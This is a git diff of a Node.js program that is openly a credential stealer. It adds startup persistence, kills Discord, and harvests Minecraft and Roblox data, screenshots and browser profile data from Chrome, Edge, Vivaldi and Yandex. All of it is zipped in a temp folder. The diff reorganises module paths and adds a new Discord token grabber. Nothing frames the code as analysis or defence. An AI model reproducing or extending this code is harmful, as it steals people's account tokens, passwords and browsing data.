@@ -6,16 +6,17 @@ const config = require('./config');
 const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
 module.exports.tempFolder = tempFolder;
 
-config.addToStartup && require('./util/functions/startup');
-config.killDiscord  && require('./util/functions/kill-discord');
-require('./util/functions/grab-mc');
-require('./util/functions/grab-roblox');
-require('./util/functions/screenshot');
+config.addToStartup && require('./functions/startup');
+config.killDiscord  && require('./functions/kill-discord');
+require('./functions/grab-mc');
+require('./functions/grab-roblox');
+require('./functions/grab-discord-token');
+require('./functions/screenshot');
 // require('./util/functions/fake-error');
 
 const browsers = [
   ['',       ['Vivaldi']],
-  ['chrome', ['Google', 'Chrome', 'SxS']],
+  ['chrome', ['Google', 'Chrome SxS']],
   ['chrome', ['Google', 'Chrome']],
   ['msedge', ['Microsoft', 'Edge']],
   ['',       ['Yandex', 'YandexBrowser']],
@@ -25,7 +26,7 @@ const browsers = [
 mkdirSync(join(tempFolder, 'Browsers'));
 browsers.forEach((browser) => {
   const path = resolve(localAppData, browser[1].join(sep), 'User Data');
-  const grab = require('./util/functions/grab-browsers-data');
+  const grab = require('./functions/grab-browsers-data');
   // Browser data exists
   if (existsSync(path)) {
     // Kill browser process
@@ -37,6 +38,6 @@ browsers.forEach((browser) => {
 });
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
-sleep(1000).then(() => require('./util/functions/zip'));
+sleep(1000).then(() => require('./functions/zip'));
 
 process.on('beforeExit', () => rmSync(tempFolder, { recursive: true }));
